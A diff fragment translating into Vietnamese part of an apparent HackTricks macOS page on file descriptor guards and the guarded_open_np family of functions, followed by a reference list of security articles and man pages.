+Tính năng này đặc biệt hữu ích để ngăn chặn một số dạng lỗ hổng bảo mật như **truy cập file trái phép** hoặc **race condition**. Những lỗ hổng này có thể xảy ra, chẳng hạn, khi một thread truy cập file description, khiến **một thread dễ bị tấn công khác có thể truy cập file description đó**, hoặc khi một file descriptor được **kế thừa** bởi một child process dễ bị tấn công. Một số hàm liên quan đến chức năng này gồm:
 
-- `guarded_open_np`: Opens a file descriptor with a guard
-- `guarded_close_np`: Close it
-- `change_fdguard_np`: Change guard flags on a descriptor (even removing the guard protection)
+- `guarded_open_np`: Mở file descriptor kèm guard
+- `guarded_close_np`: Đóng file descriptor
+- `change_fdguard_np`: Thay đổi các cờ guard trên descriptor (kể cả gỡ bỏ cơ chế bảo vệ bằng guard)
 
 ## References
 
-- [1] [POSIX.1-2024 — Base Definitions, Ch. 4 (File Access Permissions, Directory Protection, Pathname Resolution)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
+- [1] [POSIX.1-2024 — Định nghĩa cơ sở, Ch. 4 (Quyền truy cập file, Bảo vệ thư mục, Phân giải tên đường dẫn)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
 - [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
 - [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
 - [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
-- [5] [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
-- [6] [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
-- [7] [Mickey (Jhftss) - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
-- [8] [Kandji - Uncovering Apple Vulnerabilities: The diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)
-
+- [5] [The Eclectic Light Company - Những hệ thống file và dịch vụ cloud nào giữ lại extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
+- [6] [Microsoft - Gót chân Achilles của Gatekeeper: phát hiện lỗ hổng macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
+- [7] [Mickey (Jhftss) - Kỷ nguyên mới của các vụ thoát macOS Sandbox](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
+- [8] [Kandji - Phát hiện lỗ hổng Apple: câu chuyện kiểm tra diskarbitrationd và storagekitd, Phần 1](https://www.kandji.io/blog/macos-audit-story-part1)
 {{#include ../../../../banners/hacktricks-training.md}}
